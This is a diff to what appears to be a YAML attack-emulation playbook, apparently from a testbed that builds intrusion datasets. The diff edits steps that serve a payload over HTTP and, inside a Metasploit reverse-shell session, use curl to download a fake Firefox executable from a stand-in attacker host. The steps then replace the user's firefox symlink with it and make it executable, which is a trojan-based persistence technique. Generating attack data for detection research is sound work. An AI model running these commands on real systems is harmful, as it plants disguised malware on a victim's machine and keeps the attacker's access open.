@@ -32,7 +32,7 @@ commands:
   # serve payload via http
   - type: webserv
     local_path: /home/aecid/firefox-startup
-    port: 8081
+    port: 8083
     background: True
 
 ################### SERVE VEILTRANSFER CLIENT ############################
@@ -182,6 +182,7 @@ commands:
     cmd: stty rows 38 columns 116
     session: revshell
 
+  # needed for xclip and wmctrl
   - type: msf-session
     cmd: export DISPLAY=:0
     session: revshell
@@ -190,18 +191,18 @@ commands:
 
   # download fake firefox executable
   - type: msf-session
-    cmd: curl -o /home/judy/.local/share/firefox/firefox-startup suspicious-website.com:8081/index"
+    cmd: curl -o /home/judy/.local/share/firefox/firefox-startup suspicious-website.com:8083/index
     session: revshell
-
-  # make it executable
-  - type: msf-session
-    session: revshell
-    cmd: chmod +x /home/judy/.local/share/firefox/firefox-startup
 
   # replace the symlink
   - type: msf-session
     session: revshell
     cmd: ln -sf /home/judy/.local/share/firefox/firefox-startup /home/judy/.local/bin/firefox
+
+  # make it executable
+  - type: msf-session
+    session: revshell
+    cmd: chmod +x /home/judy/.local/share/firefox/firefox-startup
 
 ################### ATTACKER GATHERS INFORMATION ############################
 
